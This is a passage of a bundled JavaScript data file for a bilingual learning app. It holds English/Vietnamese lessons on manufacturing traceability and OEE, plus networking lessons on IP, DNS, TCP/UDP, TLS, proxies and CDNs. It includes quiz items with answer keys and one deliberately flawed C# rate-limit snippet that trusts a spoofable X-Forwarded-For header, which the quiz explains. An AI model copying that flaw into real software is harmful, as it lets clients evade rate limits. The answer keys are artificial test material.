VI: Hỏi: thay khuôn tính là thời gian kế hoạch hay thời gian dừng? OEE sẽ thay đổi nhiều.`,`Machine counters may include test shots. Agree how to count them.
VI: Bộ đếm của máy có thể tính cả lần ép thử. Cần thống nhất cách tính.`,`A wrong scan breaks the trace. Reject lots that are not allowed for this order.
VI: Quét sai làm đứt chuỗi truy xuất. Từ chối các lô không hợp lệ cho lệnh này.`,`Machine and server clocks must be in sync, or stop times overlap.
VI: Đồng hồ của máy và server phải đồng bộ, nếu không thời gian dừng sẽ bị chồng lên nhau.`]}],remember:`Record every lot at every step. OEE = availability × performance × quality.
VI: Ghi nhận mọi lô ở mọi bước. OEE = độ sẵn sàng × hiệu suất × chất lượng.`,questions:[{id:"manufacturing.traceability-oee.1",kind:"mcq",difficulty:"easy",prompt:`A customer complains about cover lot C-0712. You must find which resin lot was used. What is this called?
VI: Khách khiếu nại về lô nắp C-0712. Bạn phải tìm ra lô nhựa nào đã được dùng. Việc này gọi là gì?`,choices:["Forward trace","Backflush","Backward trace","Load leveling"],answer:2,why:`Going from the product back to its materials is a backward trace. Forward trace goes from a material lot to the customers.
VI: Đi từ sản phẩm ngược về nguyên liệu là truy xuất ngược. Truy xuất xuôi đi từ lô nguyên liệu đến khách hàng.`},{id:"manufacturing.traceability-oee.2",kind:"code",difficulty:"medium",prompt:`What does this code print?
VI: Đoạn code này in ra gì?`,code:{lang:"ts",text:`const availability = 0.8;
const performance = 0.9;
const quality = 1.0;
const oee = availability * performance * quality;
console.log(Math.round(oee * 100) + '%');`},choices:["90%","72%","85%","270%"],answer:1,why:`OEE multiplies the three factors: 0.8 × 0.9 × 1.0 = 0.72, so 72%. It is not an average, so 85% is wrong.
VI: OEE nhân ba yếu tố: 0,8 × 0,9 × 1,0 = 0,72, tức 72%. Đây không phải trung bình cộng, nên 85% là sai.`},{id:"manufacturing.traceability-oee.3",kind:"debug",difficulty:"hard",prompt:`The OEE report for IM-03 shows 104%. What is the most likely cause?
VI: Báo cáo OEE của IM-03 hiện 104%. Nguyên nhân khả dĩ nhất là gì?`,choices:[`The machine had no breakdowns during the week
VI: Máy không hỏng lần nào trong tuần`,`Too many NG pieces were recorded this week
VI: Tuần này ghi nhận quá nhiều hàng NG`,`The ideal cycle time in the system is too slow
VI: Thời gian chu kỳ chuẩn trong hệ thống bị đặt quá chậm`,`The planned time includes the lunch break
VI: Thời gian kế hoạch có tính cả giờ nghỉ trưa`],answer:2,why:`With correct data, OEE cannot pass 100%. If the ideal cycle time is slower than reality, performance goes above 100%. Fix the master data, not the formula.
VI: Nếu dữ liệu đúng, OEE không thể vượt 100%. Nếu chu kỳ chuẩn chậm hơn thực tế, hiệu suất sẽ vượt 100%. Hãy sửa dữ liệu gốc, không sửa công thức.`},{id:"manufacturing.traceability-oee.4",kind:"scenario",difficulty:"medium",prompt:"At material issue, an operator scans a pigment lot that is in `QC hold`. What should the system do?\nVI: Khi xuất vật tư, công nhân quét một lô hạt màu đang ở trạng thái `QC hold`. Hệ thống nên làm gì?",choices:[`Accept it, since the operator holds the real bag
VI: Chấp nhận, vì công nhân đang cầm bao hàng thật`,`Accept it, and fix the lot status at month end
VI: Chấp nhận, cuối tháng sửa trạng thái lô sau`,`Reject the scan and show that the lot is not released
VI: Từ chối và báo rằng lô này chưa được duyệt`,`Accept it, but hide the lot from the trace report
VI: Chấp nhận nhưng ẩn lô khỏi báo cáo truy xuất`],answer:2,why:`A lot on hold has not passed inspection. Using it can put bad material into good products. The scan is the last chance to stop it.
VI: Lô đang chờ kiểm là lô chưa qua kiểm tra. Dùng nó có thể đưa vật tư lỗi vào sản phẩm. Bước quét mã là cơ hội cuối cùng để chặn lại.`},{id:"manufacturing.traceability-oee.5",kind:"truefalse",difficulty:"medium",prompt:`Two plants both report OEE of 85%. So their machines are equally efficient.
VI: Hai nhà máy đều báo OEE 85%. Vậy máy của họ hiệu quả như nhau.`,choices:["True","False"],answer:1,why:`Plants define OEE differently. For example, one counts mold changes as planned time, the other as stops. Compare only when the definitions match.
VI: Mỗi nhà máy định nghĩa OEE khác nhau. Ví dụ, nơi tính thay khuôn vào thời gian kế hoạch, nơi tính là thời gian dừng. Chỉ so sánh khi định nghĩa giống nhau.`}]}],cheatSheet:[{title:"Master data · Dữ liệu gốc",items:[{term:"BOM · Định mức NVL",meaning:`Recipe: components and quantity per one parent unit
VI: Công thức: vật tư và số lượng cho một đơn vị cấp cha`},{term:"Multi-level BOM · BOM nhiều cấp",meaning:`A component that has its own BOM, like a wheel in a bicycle
VI: Vật tư có BOM riêng, như bánh xe trong xe đạp`},{term:"Scrap factor · Tỷ lệ hao hụt",meaning:`Extra % planned for loss: 50 g × 1.04 = 52 g
VI: Phần % cộng thêm cho hao hụt: 50 g × 1,04 = 52 g`},{term:"BOM version · Phiên bản BOM",meaning:`Each change is a new version with valid-from and valid-to dates
VI: Mỗi lần thay đổi là một phiên bản mới, có ngày hiệu lực từ và đến`},{term:"Routing · Quy trình công nghệ",meaning:`Ordered steps (operations) and where each one runs
VI: Các công đoạn theo thứ tự và nơi thực hiện từng công đoạn`},{term:"Work center · Tổ máy / chuyền",meaning:`Machine or group of machines or people doing one kind of job
VI: Máy, nhóm máy hoặc nhóm người làm cùng một loại việc`},{term:"Setup vs run · Chuẩn bị và chạy",meaning:`Setup once per batch; run time for every piece
VI: Chuẩn bị tính một lần mỗi lô; thời gian chạy tính trên từng sản phẩm`}]},{title:"Production · Sản xuất",items:[{term:"Production order · Lệnh sản xuất",meaning:`Make this quantity of this item by this date
VI: Làm bao nhiêu, mã hàng nào, xong trước ngày nào`},{term:"Order status · Trạng thái lệnh",meaning:`Planned → Released → In progress → Completed → Closed
VI: Dự kiến → Phát hành → Đang sản xuất → Hoàn thành → Đóng`},{term:"Material issue · Xuất NVL",meaning:`Components leave the warehouse for an order
VI: Vật tư được xuất khỏi kho cho một lệnh sản xuất`},{term:"FG receipt · Nhập kho thành phẩm",meaning:`Good finished products go into stock
VI: Thành phẩm đạt được nhập vào kho`},{term:"Backflush · Tự trừ NVL",meaning:`System issues components from the BOM when output is reported
VI: Hệ thống tự trừ vật tư theo BOM khi báo cáo sản lượng`},{term:"By-product · Phụ phẩm",meaning:`Extra output that still has value, like regrind
VI: Đầu ra phụ vẫn còn giá trị, như nhựa nghiền tái sinh`},{term:"Variance · Chênh lệch",meaning:`Real usage minus planned usage; explain it before closing
VI: Mức dùng thực tế trừ định mức; phải giải trình trước khi đóng lệnh`}]},{title:"Planning · Kế hoạch",items:[{term:"MRP · Hoạch định nhu cầu vật tư",meaning:`Calculates what to make or buy, how many and when
VI: Tính cần làm hoặc mua gì, bao nhiêu và khi nào`},{term:"Net requirement · Nhu cầu ròng",meaning:`Gross − on hand − open orders + safety stock
VI: Tổng nhu cầu − tồn kho − đơn đang mở + tồn kho an toàn`},{term:"Lead time · Thời gian chờ",meaning:`Time to make or buy; MRP goes back by it to find the start date
VI: Thời gian để làm hoặc mua; MRP lùi theo nó để ra ngày bắt đầu`},{term:"Lot size · Quy cách lô",meaning:`Rounding rule, for example whole 25 kg bags only
VI: Quy tắc làm tròn, ví dụ chỉ mua nguyên bao 25 kg`},{term:"Capacity / load · Năng lực / tải",meaning:`Hours available vs hours needed on a work center
VI: Số giờ có sẵn so với số giờ cần ở một tổ máy`},{term:"Bottleneck · Điểm nghẽn",meaning:`Slowest step; it limits the output of the whole plant
VI: Bước chậm nhất; nó giới hạn sản lượng của cả nhà máy`},{term:"Finite capacity · Năng lực hữu hạn",meaning:`Scheduling that never loads a machine over its hours
VI: Lập lịch không bao giờ xếp tải vượt số giờ của máy`}]},{title:"Quality and tracking · Chất lượng và truy xuất",items:[{term:"IQC / IPQC / OQC",meaning:`Checks at incoming, in-process and outgoing
VI: Kiểm tra đầu vào, trong quá trình và đầu ra`},{term:"OK / NG · Đạt / Không đạt",meaning:`Pass or fail; NG stock is kept apart and blocked
VI: Đạt hoặc không đạt; hàng NG được tách riêng và khóa lại`},{term:"ppm",meaning:`Defects per million: NG × 1,000,000 ÷ total
VI: Số lỗi trên một triệu: NG × 1.000.000 ÷ tổng số`},{term:"Rework vs scrap · Sửa lại / Hủy",meaning:`Fix and inspect again, or remove from stock with a reason
VI: Sửa rồi kiểm lại, hoặc trừ khỏi kho kèm lý do`},{term:"8D",meaning:`Team method: contain, find root cause, fix, prevent repeat
VI: Phương pháp nhóm: khoanh vùng, tìm nguyên nhân gốc, khắc phục, phòng ngừa`},{term:"Lot traceability · Truy xuất lô",meaning:`Follow a lot forward to customers and backward to materials
VI: Theo dõi lô xuôi đến khách hàng và ngược về nguyên liệu`},{term:"OEE",meaning:`Availability × performance × quality
VI: Độ sẵn sàng × hiệu suất × chất lượng`}]}]},J=Object.freeze(Object.defineProperty({__proto__:null,default:Q},Symbol.toStringTag,{value:"Module"})),X={id:"networking",title:"Networking",emoji:"📡",tagline:"IP, DNS, TCP, TLS — what happens before HTTP",lessons:[{id:"networking.ip-ports",title:"IP addresses and ports",summary:"Which machine, and which program on it.",minutes:4,blocks:[{type:"text",text:`An **IP address** is the address of a machine on a network.
A **port** is a number from 0 to 65535. It picks one program on that machine.`},{type:"diagram",text:`   203.0.113.10 : 443
   └── machine ─┘  └ program

 IP address = building address
 Port       = apartment number`},{type:"text",text:"**IPv4** looks like `192.168.1.20`: four numbers from 0 to 255. There are only about 4.3 billion of them. **IPv6** is longer, like `2001:db8::1`. It exists because IPv4 addresses ran out."},{type:"text",text:"Some IPv4 ranges are **private**: `10.x.x.x`, `172.16.x.x` to `172.31.x.x`, and `192.168.x.x`. They work only inside a local network. The internet does not route them."},{type:"diagram",text:` laptop 192.168.1.20 ─┐
 phone  192.168.1.21 ─┼─► Router (NAT)
 TV     192.168.1.22 ─┘        │
                               ▼
          Internet sees: 203.0.113.10
          (one public IP for all three)`},{type:"text",text:"**NAT** (Network Address Translation) lets many private devices share one public IP. The router rewrites the addresses on the way out and back. So a server on the internet usually cannot start a connection to your laptop."},{type:"text",text:'A server program **binds** to an IP and a port. That means it listens there. `127.0.0.1`, also called **localhost**, always means "this same machine".'},{type:"compare",left:{title:"Bind to 127.0.0.1",items:["Only programs on the same machine can connect","Safe default for a database on a dev laptop"]},right:{title:"Bind to 0.0.0.0",items:["Listens on every network card of the machine","Other machines can connect, if the firewall allows it"]}},{type:"diagram",text:` Port   Who usually listens
 ─────  ─────────────────────────
 22     SSH (remote shell)
 80     HTTP (web, not encrypted)
 443    HTTPS (web with TLS)
 1433   SQL Server
 5432   PostgreSQL`},{type:"example",title:"Works on the server, not from my laptop",text:"A teammate starts an API on a test server at `127.0.0.1:5000`. They test it on that server, and it works. From your laptop, the connection is refused. The fix: bind to `0.0.0.0:5000` and open port 5000 in the firewall."}],remember:"IP = which machine. Port = which program. 127.0.0.1 = only this machine.",questions:[{id:"networking.ip-ports.1",kind:"mcq",difficulty:"easy",prompt:"Your laptop shows the IP `192.168.1.20`. A website says your IP is `203.0.113.10`. Why are they different?",choices:["Your router uses NAT and shares one public IP","The website reads your IP from an old cache","Your laptop picks a new IP for each request","IPv6 changes the address before it is sent"],answer:0,why:"`192.168.x.x` is a private address that works only at home. The router translates it to its one public IP. The website sees only that public IP."},{id:"networking.ip-ports.2",kind:"debug",difficulty:"medium",prompt:'An API runs on a test server. On that server, `curl http://localhost:5000` works. From your laptop, `http://10.0.0.5:5000` gets "connection refused". What is the most likely cause?',choices:["The DNS record for the test server points to the wrong IP","The API listens only on 127.0.0.1, not on all addresses","Port 5000 is reserved for SQL Server traffic on Windows","The API accepts outside calls only when HTTPS is used"],answer:1,why:"A program bound to `127.0.0.1` accepts only connections from the same machine. Calls to `10.0.0.5` find nothing listening. DNS is not involved, because you used the IP directly.",remember:"Works locally, refused remotely → check what the server binds to."},{id:"networking.ip-ports.3",kind:"truefalse",difficulty:"medium",prompt:"A server on the internet can send a request straight to `192.168.1.20` in your home network.",choices:["True","False"],answer:1,why:"Private addresses are not routed on the internet. Many homes use the same `192.168.1.x` range. Only your router knows which device has that address."},{id:"networking.ip-ports.4",kind:"scenario",difficulty:"medium",prompt:"You run PostgreSQL on a cloud server. Only the API on the same server should use it. Which setting is safest?",choices:["Listen on 127.0.0.1, port 5432","Listen on 0.0.0.0, port 5432","Listen on 0.0.0.0, but use port 80","Listen on the public IP with a long password"],answer:0,why:"With `127.0.0.1`, nobody outside the machine can even reach the database. A strong password helps, but an open port still invites attacks. Changing the port number hides nothing.",remember:"Do not expose a port that only local programs need."}]},{id:"networking.dns",title:"DNS: from name to IP address",summary:"How `shop.example.com` becomes a number.",minutes:4,blocks:[{type:"text",text:"Computers connect with IP addresses. People remember names like `shop.example.com`. **DNS** (Domain Name System) turns a name into an IP address."},{type:"diagram",text:` App: "IP of shop.example.com?"
   │
   ▼
 Resolver
   │ 1. ask ──────► Root server
   │ ◄── "ask the .com servers"
   │ 2. ask ──────► TLD server (.com)
   │ ◄── "ask ns1.example.com"
   │ 3. ask ──────► Authoritative server
   │ ◄── "203.0.113.10, TTL 3600"
   ▼
 App gets 203.0.113.10 (cached 1 hour)`},{type:"text",text:"The **resolver** does this work for you. It is usually run by your internet provider, your company, or a public service like `8.8.8.8`. The **TLD** (top-level domain) server knows who handles each `.com` name. The **authoritative** server holds the real records for the domain."},{type:"text",text:"Most answers come from a cache. The full chain runs only when no cache has the answer."},{type:"diagram",text:` Type   Points to       Example
 ─────  ──────────────  ─────────────────
 A      IPv4 address    203.0.113.10
 AAAA   IPv6 address    2001:db8::10
 CNAME  another name    www → shop.cdn.net
 MX     mail server     mail.example.com
 TXT    any text        domain proof, SPF`},{type:"text",text:"Every record has a **TTL** (time to live) in seconds. Resolvers, the OS and browsers keep the answer that long. So after you change a record, some users get the old IP until their cache expires."},{type:"example",title:"Moving a shop to a new server",text:"The A record has a TTL of 86400 seconds, that is one day. Two days before the move, lower the TTL to 300 (5 minutes). Wait at least one day, so the old long TTL is gone from all caches. On moving day, change the IP. Most users switch within minutes."},{type:"text",text:"The **hosts file** maps names to IPs on one machine only. The OS usually checks it before asking DNS. Developers use it to test a new server before the real DNS changes."},{type:"code",code:{lang:"text",text:`# Linux/macOS: /etc/hosts
# Windows: C:\\Windows\\System32\\drivers\\etc\\hosts
10.0.0.5   shop.example.com`}}],remember:"DNS turns names into IPs. The TTL decides how long old answers live.",questions:[{id:"networking.dns.1",kind:"debug",difficulty:"medium",prompt:"You changed the A record of `api.example.com` to a new server 10 minutes ago. The TTL was 3600. Some users reach the new server, others the old one. Why?",choices:["Some resolvers still cache the old record until its TTL ends","The new server rejects users who connected before the change","The browser needs a new TLS certificate for the new IP address","DNS records are only published once a day, at midnight UTC"],answer:0,why:"A TTL of 3600 lets caches keep the old answer for up to one hour. Users whose cache already expired get the new IP. Certificates belong to names, not IPs, so the IP change alone does not need a new one."},{id:"networking.dns.2",kind:"mcq",difficulty:"easy",prompt:"You want `www.example.com` to point to another **name**, `example.azurewebsites.net`. Which record type do you use?",choices:["A record","CNAME record","MX record","TXT record"],answer:1,why:"A CNAME points one name to another name. An A record points a name to an IPv4 address. MX is for mail servers."},{id:"networking.dns.3",kind:"scenario",difficulty:"medium",prompt:"You will move a site to a new IP on Friday. The A record TTL is 86400 seconds (one day). What should you do on Wednesday?",choices:["Raise the TTL, so users keep the current record longer","Lower the TTL to a few minutes, so caches expire fast","Nothing, since DNS changes reach all users in seconds","Delete the A record, so every cache must ask again"],answer:1,why:"Caches keep an answer for the TTL they received. With a short TTL in place before Friday, the IP change spreads in minutes. Deleting the record would make the site unreachable.",remember:"Lower the TTL before a planned DNS change."},{id:"networking.dns.4",kind:"truefalse",difficulty:"easy",prompt:"Editing the hosts file on your laptop changes the DNS answer for everyone in your company.",choices:["True","False"],answer:1,why:"The hosts file is read only by the machine it is on. Other people still ask the normal DNS servers."}]},{id:"networking.tcp-udp",title:"TCP vs UDP",summary:"Reliable and ordered, or fast and lossy.",minutes:4,blocks:[{type:"text",text:"Data travels in small pieces called **packets**. Packets can get lost, arrive late, or arrive out of order. **TCP** and **UDP** are two ways to send them."},{type:"diagram",text:` Client                     Server
   │ ── SYN ────────────────► │
   │ ◄──────────────── SYN-ACK│
   │ ── ACK ────────────────► │
   │     connection open      │
   │ ── data ───────────────► │

 SYN = "let us connect"
 ACK = "I got it"`},{type:"text",text:"Before TCP sends data, both sides do a **3-way handshake**. It costs one **round trip** (there and back) before data can flow. Then TCP numbers every packet. Lost packets are sent again, and the receiver puts them back in order."},{type:"compare",left:{title:"TCP",items:["Connects first (handshake)","Lost packets are sent again","Data arrives in order","Used by: web (HTTP/1.1, HTTP/2), databases, SSH"]},right:{title:"UDP",items:["No connection, it just sends","Lost packets stay lost","No order, but no waiting","Used by: most DNS queries, video calls, games, HTTP/3"]}},{type:"example",title:"Video call vs bank transfer",text:"In a video call, a lost packet is a tiny glitch. Waiting for a resend would freeze the picture, and old video is useless. So calls use UDP. A bank transfer is the opposite. Every byte must arrive in order, so it uses TCP."},{type:"text",text:"A new TCP connection costs a handshake, and HTTPS adds more (next lesson). So apps **reuse** connections. A **connection pool** keeps open connections ready for the next request. Database drivers and `HttpClient` do this for you."},{type:"code",code:{lang:"csharp",text:`// Bad: a new HttpClient for every call.
// Each one opens new connections.
using var http = new HttpClient();
var res = await http.GetAsync(url);

// Good: one shared client for the app.
// It keeps connections open and reuses them.
static readonly HttpClient Http = new();`}}],remember:"TCP = reliable and ordered, but it waits. UDP = fast, but data may be lost.",questions:[{id:"networking.tcp-udp.1",kind:"mcq",difficulty:"easy",prompt:"A multiplayer game sends player positions 30 times per second. Which protocol fits better?",choices:["UDP, because an old position is useless if it comes late","TCP, because every position must arrive in the right order","TCP, because UDP cannot send more than once per second","UDP, because it encrypts the data by default"],answer:0,why:"A new position replaces the old one 33 ms later. Waiting for a resend, as TCP does, only adds lag. UDP has no speed limit and no built-in encryption."},{id:"networking.tcp-udp.2",kind:"truefalse",difficulty:"medium",prompt:"With TCP, when a packet is lost, your app code must notice it and send the data again.",choices:["True","False"],answer:1,why:"TCP itself detects lost packets and resends them. Your app just reads a complete, ordered stream of bytes."},{id:"networking.tcp-udp.3",kind:"perf",difficulty:"hard",prompt:"An API creates a new `HttpClient` for every outgoing call. Under load, calls get slow and the server shows thousands of sockets in `TIME_WAIT`. What is the fix?",choices:["Switch the outgoing calls from TCP to UDP","Raise the timeout of each HttpClient to 5 minutes","Share one HttpClient so open connections are reused","Call the server by IP so DNS lookups are skipped"],answer:2,why:"Each new client opens new TCP connections and pays a new handshake. Closed connections stay in `TIME_WAIT` for a while and use up ports. One shared client (or `IHttpClientFactory`) reuses connections.",remember:"Reuse connections. Do not open a new one per call."},{id:"networking.tcp-udp.4",kind:"compare",difficulty:"medium",prompt:"One API request runs 200 small database queries. Which approach is better?",choices:["Open a new database connection for each query, then close it","Use the driver connection pool, so open connections are reused"],answer:1,why:"Opening a connection needs a handshake and a login each time. A pool pays that cost once and reuses the open connection. Most drivers pool by default, so do not turn it off."}]},{id:"networking.tls",title:"TLS and HTTPS",summary:"Private, unchanged, and talking to the right server.",minutes:4,blocks:[{type:"text",text:"**TLS** (Transport Layer Security) adds a secure layer on top of TCP. **HTTPS** is plain HTTP sent inside TLS. TLS gives you three things:"},{type:"list",items:["**Privacy** — data is encrypted, so others on the path cannot read it.","**Integrity** — if someone changes the data on the way, the receiver notices.","**Identity** — the certificate proves the server controls that domain name."]},{type:"diagram",text:` Root CA         (built into the OS)
   │ signs
   ▼
 Intermediate CA (sent by the server)
   │ signs
   ▼
 shop.example.com (server certificate)
   valid 2026-01-10 → 2026-04-10`},{type:"text",text:'A **certificate** says: "this public key belongs to this domain name". A **CA** (Certificate Authority) signs it. Your OS or browser trusts a short list of root CAs. It checks each signature up the chain to one of them.'},{type:"example",title:"The Saturday outage",text:"A certificate expires at 02:00 on a Saturday. Browsers show a full-page warning. Mobile apps and other services refuse to connect at all. Nobody changed the code, but everything is down. The fix: automatic renewal, plus an alert 30 days before expiry."},{type:"text",text:"TLS hides a lot, but not everything. The network still sees both IP addresses. It usually sees the domain name too. The browser sends it in plain text in the **SNI** (Server Name Indication) field, and DNS queries often show it."},{type:"compare",left:{title:"Hidden by TLS",items:["URL path and query, like `/orders/42?card=1`","Headers and cookies","Request and response body"]},right:{title:"Still visible",items:["Your IP and the server IP","The domain name (in SNI and DNS)","How much data, and when"]}}],remember:"TLS = private, unchanged, right server. Watch the expiry date.",questions:[{id:"networking.tls.1",kind:"mcq",difficulty:"easy",prompt:"You visit an HTTPS site on café Wi-Fi. What can the café network still see?",choices:["The URL path, like `/orders/42`","The domain name of the site","Your session cookie","The JSON response body"],answer:1,why:"The domain name usually leaks through SNI and DNS. The path, headers, cookies and body are inside the encrypted TLS stream."},{id:"networking.tls.2",kind:"debug",difficulty:"hard",prompt:'A site works in Chrome. But `curl` and your C# service fail with "unable to verify the certificate chain". The certificate is not expired. What is the most likely cause?',choices:["curl and .NET do not support TLS 1.2 or newer","The server does not send the intermediate certificate","The domain name has no AAAA record for IPv6 clients","Chrome skips the chain check for well-known sites"],answer:1,why:"Browsers can often fill in a missing intermediate from a cache or by downloading it. Many other clients cannot. The server must send its full chain, not only its own certificate.",remember:"Works in the browser, fails in code → check the certificate chain."},{id:"networking.tls.3",kind:"scenario",difficulty:"easy",prompt:"Monday morning, every client gets certificate errors from your API. Nobody deployed anything. What do you check first?",choices:["Whether the database ran out of disk space","Whether the certificate expired over the weekend","Whether a teammate changed the CORS settings","Whether the DNS TTL is set too high"],answer:1,why:"Certificate errors with no deploy point to time. An expired certificate breaks all clients at once. CORS and disk problems give different errors."},{id:"networking.tls.4",kind:"truefalse",difficulty:"medium",prompt:"A valid certificate proves that the company behind the site is honest.",choices:["True","False"],answer:1,why:"Most certificates only prove control of the domain name. A phishing site can get a valid certificate for its own fake domain."},{id:"networking.tls.5",kind:"scenario",difficulty:"medium",prompt:"Someone on the network changes a few bytes of an HTTPS response on the way. What happens?",choices:["The browser shows the changed page with a warning icon","The browser detects the change and drops the connection","The server sends the page again over plain HTTP","Nothing, since TLS only hides data and cannot detect changes"],answer:1,why:"TLS checks every piece of data it receives. A changed byte fails the check, so the connection is closed with an error. That is the integrity part of TLS."}]},{id:"networking.url-journey",title:"What happens when you type a URL",summary:"DNS, TCP, TLS, HTTP, server, render — in order.",minutes:4,blocks:[{type:"text",text:"You type `https://shop.example.com/cart` and press Enter. Many steps run in under a second. Each one can be slow or fail, so learn the order."},{type:"diagram",text:` Browser
  1. DNS   shop.example.com → 203.0.113.10
  2. TCP   SYN, SYN-ACK, ACK (port 443)
  3. TLS   hello, certificate, keys
  4. HTTP  GET /cart
           │
           ▼
 Server
  5. App   check login, query DB, build HTML
  6. HTTP  200 OK + HTML
           │
           ▼
 Browser
  7. Parse HTML, load CSS, JS, images
  8. Render the page on screen`},{type:"text",text:"Steps 1 to 3 happen before your app even sees the request. A **round trip** is one message there and back. The TCP handshake costs one round trip. The TLS handshake costs one more with TLS 1.3, or two with TLS 1.2."},{type:"diagram",text:` DevTools → Network → Timing

 DNS lookup        ██            20 ms
 Initial connect     ██          30 ms
 SSL (TLS)             ███       40 ms
 Waiting for server       ████  120 ms
 Content download             █  10 ms`},{type:"text",text:'In DevTools, click a request, then open **Timing**. "Waiting for server response" is one round trip plus your server work. The phases before it are network setup.'},{type:"example",title:"Where did the time go?",text:"Users in another country say the site is slow. DevTools shows 400 ms of DNS, connect and TLS. The server work is only 50 ms. So the fix is in the network, not the code. For example, a CDN close to those users (next lesson)."},{type:"text",text:"The second request to the same site is faster. The DNS answer is cached, and the open connection is reused. Steps 1 to 3 are skipped."}],remember:"DNS → TCP → TLS → HTTP → server → response → render. Any step can be the slow one.",questions:[{id:"networking.url-journey.1",kind:"mcq",difficulty:"easy",prompt:"For a new HTTPS connection, what is the order of the first steps?",choices:["TCP → DNS → TLS → HTTP","DNS → TCP → TLS → HTTP","DNS → TLS → TCP → HTTP","HTTP → DNS → TCP → TLS"],answer:1,why:"You need the IP (DNS) before you can connect (TCP). TLS runs on top of the TCP connection. Only then can the HTTP request be sent."},{id:"networking.url-journey.2",kind:"debug",difficulty:"medium",prompt:"The browser shows `ERR_NAME_NOT_RESOLVED`. Which step failed?",choices:["TCP: the server refused the connection on port 443","DNS: the name could not be turned into an IP address","TLS: the certificate did not match the domain name","HTTP: the server returned 404 Not Found for the page"],answer:1,why:'"Name not resolved" means DNS gave no IP for the name. Check the spelling, the DNS records, and the DNS settings of the machine.'},{id:"networking.url-journey.3",kind:"perf",difficulty:"medium",prompt:"A slow API call shows this timing in DevTools. DNS 5 ms, connect 10 ms, TLS 15 ms, waiting for server 2.8 s. Where do you look?",choices:["The DNS provider, since lookups should take 0 ms","The server: its code, DB queries or calls to other services","The TLS setup, since certificates slow down every request","The Wi-Fi of the user, since 30 ms of setup is too slow"],answer:1,why:"Network setup took only 30 ms. Almost all the time is spent waiting for the server to answer. So the problem is in the server work.",remember:'Long "waiting for server" → look at the server, not the network.'},{id:"networking.url-journey.4",kind:"truefalse",difficulty:"medium",prompt:"On a reused connection, the browser repeats the TCP and TLS handshakes for each request.",choices:["True","False"],answer:1,why:"A reused connection is already open and already encrypted. The browser just sends the next HTTP request on it. That is why reuse saves time."}]},{id:"networking.proxies-cdn",title:"Load balancers, reverse proxies and CDNs",summary:"What sits between the user and your app.",minutes:5,blocks:[{type:"text",text:"Users rarely talk to your app server directly. A **reverse proxy** sits in front of your servers and receives every request first. A **load balancer** is a reverse proxy that spreads requests across many servers."},{type:"diagram",text:` Users
   │
   ▼
 CDN edge (near the user)
   │ only if not in cache
   ▼
 Load balancer ── health check every 5 s
   │       │        │
   ▼       ▼        ▼
 App 1   App 2    App 3
                  (down, skipped)`},{type:"list",items:["**Health check** — the load balancer calls a URL like `/health` often. A server that fails stops getting traffic.","**TLS termination** — the proxy handles HTTPS, so the app servers do not have to.","**Sticky sessions** — the same user always goes to the same server."]},{type:"text",text:"Sticky sessions are needed only when a server keeps session data in its memory. They hide a risk: if that server dies, the session is lost. A shared store, like Redis or the database, lets any server handle any user."},{type:"text",text:"Behind a proxy, your app sees the **proxy** IP, not the user IP. The proxy puts the real client IP in a header, usually `X-Forwarded-For`. Trust that header only when it comes from your own proxy. Otherwise anyone can fake it."},{type:"code",code:{lang:"http",text:`GET /cart HTTP/1.1
Host: shop.example.com
X-Forwarded-For: 198.51.100.7
X-Forwarded-Proto: https`}},{type:"text",text:"A **CDN** (Content Delivery Network) has servers called **edges** in many cities. An edge keeps copies of files like images, CSS and JavaScript. Users get them from a nearby edge, not from your faraway server."},{type:"example",title:"Old price for an hour",text:"A shop puts its product API behind a CDN. The cache time is one hour. The price changes at 9:00, but some users see the old price until 10:00. Cache static files for a long time. Cache changing data for a short time, or not at all."}],remember:"Proxies hide the client IP. CDNs serve copies. Health checks remove dead servers.",questions:[{id:"networking.proxies-cdn.1",kind:"debug",difficulty:"medium",prompt:"You moved your API behind a load balancer. Now the logs show every request coming from `10.0.0.4`. Why?",choices:["All users now share one public IP because of NAT","The app sees the load balancer; the real IP is in X-Forwarded-For","The DNS record now sends users to a private IP address","The logger caches the first IP it sees and reuses it"],answer:1,why:"The load balancer opens its own connection to your app. So the app sees the load balancer IP. Read the client IP from `X-Forwarded-For`, set by your own proxy.",remember:"Behind a proxy, the client IP comes from a header."},{id:"networking.proxies-cdn.2",kind:"scenario",difficulty:"medium",prompt:"You add a second app server. Now users get logged out at random. Sessions are kept in server memory. What is the best fix?",choices:["Remove the second server and buy a bigger one","Lower the DNS TTL so users find the server faster","Store sessions in a shared store such as Redis","Turn off the health checks on the load balancer"],answer:2,why:"Each request may land on a different server, and the other server does not know the session. A shared store lets every server see every session. Sticky sessions also work, but you lose sessions when a server dies."},{id:"networking.proxies-cdn.3",kind:"mcq",difficulty:"easy",prompt:"One of three app servers crashes. What lets the load balancer stop sending it traffic?",choices:["A longer DNS TTL for the domain name","A health check that calls each server often","A CDN edge in front of the load balancer","Sticky sessions for every logged-in user"],answer:1,why:"The health check fails on the crashed server. The load balancer then sends traffic only to the healthy ones."},{id:"networking.proxies-cdn.4",kind:"code",difficulty:"hard",prompt:"This rate limit code runs in an API. The API can also be called directly, not only through the proxy. What is the main problem?",code:{lang:"csharp",text:`var ip = Request.Headers["X-Forwarded-For"]
    .ToString();
if (await limiter.IsBlockedAsync(ip))
    return StatusCode(429);`},choices:["Header names are case-sensitive, so it is always empty","A client can send a fake X-Forwarded-For and avoid the limit","Status 429 is the wrong status code for a rate limit","An IP address string cannot be used as a limiter key"],answer:1,why:"Any client can set this header to any value. Trust it only when the request comes from your own proxy. HTTP header names are not case-sensitive, and 429 is the right code."},{id:"networking.proxies-cdn.5",kind:"perf",difficulty:"medium",prompt:"Users in Australia load 2 MB of images from your server in Europe. The pages are slow for them. What helps most?",choices:["Add more CPU to the server in Europe","Serve the images from a CDN with edges near users","Lower the DNS TTL from one hour to one minute","Switch from HTTPS to HTTP to skip the TLS step"],answer:1,why:"The distance adds a long delay to every round trip. A nearby edge cuts that delay. More CPU does not make the trip shorter."}]},{id:"networking.latency",title:"Latency and bandwidth",summary:"Why distance and round trips matter more than you think.",minutes:5,blocks:[{type:"text",text:"**Latency** is how long one trip takes. **Bandwidth** is how much data can flow per second. They are different. More of one does not fix the other."},{type:"diagram",text:` Latency   = how LONG the pipe is
 Bandwidth = how WIDE the pipe is

 Small API call (2 KB): latency decides
   ──────────────────────────►

 Big download (2 GB): bandwidth decides
   ══════════════════════════►
   ══════════════════════════►`},{type:"text",text:"**RTT** (round-trip time) is one trip there and back. Light in fiber travels about 200,000 km per second. Europe to Australia is more than 15,000 km. So one round trip takes at least 150 ms."},{type:"diagram",text:` Chatty: 1 call per item, RTT 100 ms
 ──► item 1  ◄──   100 ms
